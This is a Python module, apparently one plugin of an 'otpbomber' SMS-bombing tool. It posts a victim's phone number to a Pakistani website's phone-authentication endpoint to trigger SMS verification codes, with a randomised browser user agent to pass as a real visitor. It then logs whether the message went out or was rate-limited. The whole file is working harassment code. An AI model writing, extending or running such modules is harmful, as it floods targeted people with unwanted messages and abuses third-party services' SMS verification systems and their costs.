from otpbomber.core import *
from otpbomber.localuseragent import *

async def xstate(phone, client, out):
    name = "xstate"
    domain = "xstate"
    frequent_rate_limit=False

    headers = {
        'content-type': 'application/json',
        'origin': 'https://www.xstate.pk',
        'referer': 'https://www.xstate.pk/',
        'user-agent': random.choice(ua["browsers"]["chrome"]),
    }

    json_data = {
        'id': str(uuid4()),
        'phone': f'+92 {phone[-10:]}',
        'verification_type': 'sms',
    }

    r = await client.post('https://api.xstate.pk/auth/phone', headers=headers, json=json_data)
    try:
        data=r.json()
        if data["success"] == True:
            out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit, "rateLimit": False,"sent": True, "error": False})
            return None
    except Exception:
        out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit,  "rateLimit": False, "sent": False, "error": True})
        return None